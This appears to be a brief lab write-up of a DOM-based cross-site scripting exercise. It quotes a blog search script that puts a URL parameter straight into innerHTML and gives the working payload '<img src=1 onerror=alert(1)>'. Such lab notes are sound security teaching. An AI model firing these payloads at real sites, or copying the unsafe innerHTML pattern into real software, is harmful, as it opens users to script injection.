# XSS Lab 4: innerHTML sink

## Analysis
Vulnerability location: blog search

Script:
```
<script>
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
</script>
```

If you pass `<img src=1>` there will be an error image that loads in the site.

We can then change this to `<img src=1 onerror=alert(1)>`